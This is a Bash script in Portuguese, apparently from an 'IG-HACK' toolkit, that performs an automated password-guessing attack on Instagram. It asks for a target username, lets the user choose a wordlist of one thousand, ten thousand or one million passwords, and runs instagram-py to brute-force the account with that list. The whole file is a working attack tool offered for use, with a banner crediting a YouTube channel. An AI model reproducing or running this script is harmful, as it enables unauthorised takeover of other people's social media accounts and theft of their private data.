#wordlist selection.
grn='\033[1;32m'
red='\033[1;31m'
rset='\033[0m'
ylo='\033[1;33m'
#!/bin/bash
#seção de codificação começa :)
clear
echo
echo '
      ██╗ ██████╗       ██╗  ██╗ █████╗  ██████╗██╗  ██╗
      ██║██╔════╝       ██║  ██║██╔══██╗██╔════╝██║ ██╔╝
      ██║██║  ███╗█████╗███████║███████║██║V1.1 █████╔╝
      ██║██║   ██║╚════╝██╔══██║██╔══██║██║     ██╔═██╗
      ██║╚██████╔╝      ██║  ██║██║  ██║╚██████╗██║  ██╗
      ╚═╝ ╚═════╝       ╚═╝  ╚═╝╚═╝  ╚═╝ ╚═════╝╚═╝  ╚═╝
                [#] Ataque Automático de Senha[#]
' |lolcat
printf "\n"
printf "                \e[101m\e[1;77m  >>  Script By Gilmar Script << \e[0m\n"
printf "\n"
printf "       \e[100m\e[1;77m >>  Youtube Channel : \e[1;96m Gilmar Filho \e[100m\e[1;77m << \e[0m\n"
printf "\n"
echo
read -p "[#] User Name : " usrnm
echo
echo -e "$grn              [+]$red Type$ylo 1$red PARA 1k senhas$grn
              [+]$red Type$ylo 2$red PARA 10K Senhas$grn
              [+]$red Type$ylo 3$red PARA 1 milhão de senhas $rset"
echo
read -p "[#] Digite o Número Selecionado: " marks
echo 
if [ $marks = 1 ]
then
    instagram-py --username $usrnm --password-list $HOME/ig-hack/pass/senha1.txt
    ig-hack/pass/senha1.txt
 
elif [ $marks = 2 ]
then
    instagram-py --username $usrnm --password-list $HOME/ig-hack/pass/senha2.txt
 
elif [ $marks = 3 ]
then
    instagram-py --username $usrnm --password-list $HOME/ig-hack/pass/senha3.txt
else
echo
echo -e  "$ylo >>> exiting........! Bye Bye :) <<<$rset"
echo
sleep 1.0
cd $HOME
fi
sleep 10.0
cd $HOME/ig-hack
bash ighack.sh
